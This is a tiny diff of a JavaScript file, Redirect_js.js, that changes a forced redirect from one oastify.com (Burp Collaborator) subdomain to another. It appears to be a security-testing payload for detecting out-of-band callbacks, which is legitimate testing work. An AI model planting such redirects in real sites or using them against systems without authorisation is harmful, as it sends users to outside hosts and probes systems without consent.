@@ -1,4 +1,4 @@
 // Redirect_js.js
 
 // Redirecciona a una URL específica
-window.location.href = "https://jd0n4mma6wlesg70sim0lvg4evkm8ew3.oastify.com";
+window.location.href = "https://m0nd696vo5tea8bj3mpp9r5p6gc702or.oastify.com";
